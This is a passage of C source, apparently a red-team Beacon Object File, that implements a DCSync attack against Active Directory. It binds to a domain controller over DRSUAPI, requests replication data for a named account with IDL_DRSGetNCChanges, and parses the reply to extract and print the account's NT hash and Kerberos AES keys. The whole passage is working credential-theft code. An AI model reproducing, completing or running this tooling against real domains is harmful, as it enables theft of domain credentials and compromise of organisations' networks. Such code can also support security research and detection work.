                  propertyData[i + 4] == 'i' && propertyData[i + 5] == 0x00 &&
                  propertyData[i + 6] == 'm' && propertyData[i + 7] == 0x00) {

                char packageName[128] = {0};
                int nameIdx = 0;
                for (int j = 0;
                     j < 200 && (i + j) < propertyLen && nameIdx < 127;
                     j += 2) {
                  BYTE ch = propertyData[i + j];
                  BYTE null = propertyData[i + j + 1];

                  if (ch == 0 && null == 0)
                    break;
                  if (null != 0)
                    break;
                  if (ch < 0x20 || ch > 0x7E)
                    break;

                  packageName[nameIdx++] = ch;
                }
                packageName[nameIdx] = '\0';

                if (nameIdx > 8 && MSVCRT$strstr(packageName, "Kerberos")) {
                  DWORD dataStart = i + (nameIdx * 2) + 2;
                  if (dataStart >= propertyLen)
                    break;
                  DWORD remainingLen = propertyLen - dataStart;
                  if (remainingLen > 32768)
                    break; // Sanity check

                  BYTE *decodedValue =
                      (BYTE *)MSVCRT$malloc(remainingLen / 2 + 1);
                  if (!decodedValue)
                    break;
                  {
                    DWORD decodedLen = HexToBinary(propertyData + dataStart,
                                                   remainingLen, decodedValue);

                    if (decodedLen > 0) {
                      printf("found kerberos keys..\n");
                      if (ParseKerberosKeys(
                              decodedValue, decodedLen, samAccountName,
                              dcHostname, accountType, aes256Key, aes128Key)) {
                        if (aes256Key[0] != '\0')
                          foundAES256 = TRUE;
                        if (aes128Key[0] != '\0')
                          foundAES128 = TRUE;
                      }
                    }

                    MSVCRT$free(decodedValue);
                  }
                }
              }
            }
          }

          MSVCRT$free(decrypted);
        }
      }
    }

    current = current->pNextEntInf;
  }

  printf("\n[+] Results:");
  printf("  %s\n", samAccountName);
  if (foundNT)
    printf("  nt:\t%s\n", ntHash);
  if (foundAES256)
    printf("  aes256:\t%s\n", aes256Key);
  if (foundAES128)
    printf("  aes128:\t%s\n", aes128Key);
}

// end of cred parsing stuff

void WideCharToUTF8(const WCHAR *wstr, char *buffer, int bufferSize) {
  if (!wstr || !buffer || bufferSize <= 0)
    return;

  int bytesWritten =
      WideCharToMultiByte(CP_UTF8,    // convert to UTF-8
                          0,          // no special flags
                          wstr,       // source wide string
                          -1,         // null-terminated source
                          buffer,     // destination buffer
                          bufferSize, // size of destination buffer
                          NULL,       // default char for unconvertible chars
                          NULL        // used default char? ignore
      );

  if (bytesWritten == 0) {
    printf("Conversion failed: 0x%lx\n", GetLastError());
    buffer[0] = '\0';
  }
}

void DCSync(LPCWSTR samaccountName) {

  LPWSTR szDomain = NULL, szDc = NULL, szService = NULL;
  DSNAME dsName = {0};
  LPDWORD pMajor, pMinor, pBuild;
  PPOLICY_DNS_DOMAIN_INFO DomainInfo = NULL;
  DRS_HANDLE drsHandleBind, drsHandle;
  DSNAME *targetDsname = NULL;

  // Reset session key capture for this run
  g_SessionKeyCapturing = 0;
  g_SessionKeyCopyLen = 0;
  MSVCRT$memset(g_SessionKeyCopy, 0, sizeof(g_SessionKeyCopy));

  // get Domain
  getCurrentDomainInfo(&DomainInfo);
  szDomain = DomainInfo->DnsDomainName.Buffer;
  wprintf(L"Domain would be %s\n", szDomain);
  //
  //
  // get DC
  getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szDc);
  wprintf(L"DC: %s\n", szDc);
  char dc[256];
  wcstombs(dc, szDc, sizeof(dc)); // convert wide string to ANSI
  // char *dc = (char *)szDc;
  printf("%s\n", dc);
  // make bind
  drsHandleBind = CreateDRSBinding(dc);
  if (drsHandleBind == NULL) {
    printf("failed to make drsHandle binding\n");
    return;
  }
  printf("made drs handle binding!!\n");

  drsHandle = BindToDRS(drsHandleBind);
  if (drsHandle == NULL) {
    printf("failed to bind\n");
    return;
  }
  printf("got bind!\n");
  KERNEL32Sleep(100);

  BYTE *sessionKey = NULL;
  DWORD sessionKeyLen = 0;

  if (g_SessionKeyCopyLen > 0 && g_SessionKeyCopyLen <= 256) {
    sessionKey = (BYTE *)MSVCRT$malloc(g_SessionKeyCopyLen);
    if (sessionKey) {
      MSVCRT$memcpy(sessionKey, g_SessionKeyCopy, g_SessionKeyCopyLen);
      sessionKeyLen = g_SessionKeyCopyLen;
    }
  }

  GUID guid_s;
  WCHAR DNBuffer[1024];
  ULONG DNBUfferSize = _countof(DNBuffer);
  FetchObjectBySAM(samaccountName, DNBuffer, DNBUfferSize, &guid_s);
  const char DN[256];
  WideCharToUTF8(DNBuffer, DN, sizeof(DN));

  //  WCHAR wGuid[40];
  //  MultiByteToWideChar(CP_ACP, 0, objGuid, -1, wGuid, 40);
  //  CLSIDFromString(wGuid, &guid_s);

  // build DS name
  targetDsname = BuildDSName(DN, &guid_s);
  wprintf(L"targeting: %s\n", targetDsname->StringName);

  // get DC GUID
  printf("getting DC guid..\n");
  GUID DCGuid = {0};
  FetchGUID(szDc, &DCGuid);
  LPOLESTR guidString;
  StringFromCLSID(&DCGuid, &guidString);
  wprintf(L"GUID: %s\n", guidString);

  // prep request
  DRS_MSG_GETCHGREQ request = {0};
  InitDRSRequest(&request, &DCGuid, targetDsname);

  if (request.V8.PrefixTableDest.pPrefixEntry) {
    for (DWORD i = 0; i < request.V8.PrefixTableDest.PrefixCount && i < 15;
         i++) {
      char oidHex[128] = {0};
      for (DWORD j = 0;
           j < request.V8.PrefixTableDest.pPrefixEntry[i].prefix.length &&
           j < 16;
           j++) {
        char byte[8];
        MSVCRT$_snprintf(
            byte, sizeof(byte), "%02X ",
            request.V8.PrefixTableDest.pPrefixEntry[i].prefix.elements[j]);
        MSVCRT$strcat(oidHex, byte);
      }
    }
  }
  printf("init DS Get changes request!!\n");
  DWORD outVersion = 0;
  DRS_MSG_GETCHGREPLY reply;
  MSVCRT$memset(&reply, 0, sizeof(reply));
  ULONG result =
      IDL_DRSGetNCChanges(drsHandle, 8, &request, &outVersion, &reply);
  wprintf(L"result of request: 0x%lx\n", result);
  if (result != 0) {
    printf("failed!\n");
    return;
  }
  REPLENTINFLIST *objects = NULL;
  switch (outVersion) {
  case 1:
    objects = reply.V1.pObjects;
    break;
  case 6:
    objects = reply.V6.pObjects;
    break;
  case 7:
    objects = reply.V6.pObjects;
    break;
  case 9:
    objects = reply.V6.pObjects;
    break;
  default:
    printf("unkown reply version!\n");
    return;
  }
  ENTINF *entinf = &objects->Entinf;
  ATTRBLOCK *attrBlock = &entinf->AttrBlock;

  for (ULONG i = 0; i < attrBlock->attrCount; i++) {
    ATTR *attr = &attrBlock->pAttr[i];
    if (attr->attrTyp == ATT_UNICODE_PWD && attr->AttrVal.valCount > 0) {
      DWORD valLen = attr->AttrVal.pAVal[0].valLen;
      if (valLen == 36 || valLen == 40) {
        break;
      }
    }
  }
  int size_needed =
      WideCharToMultiByte(CP_UTF8, 0, samaccountName, -1, NULL, 0, NULL, NULL);
  char *buffer = (char *)malloc(size_needed);
  WideCharToMultiByte(CP_UTF8, 0, samaccountName, -1, buffer, size_needed, NULL,
                      NULL);
  const char *samAccountName = buffer;
  printf("got objects..\n");
  ProcessCredentials(objects, samAccountName, dc, sessionKey, sessionKeyLen);

  return;
}
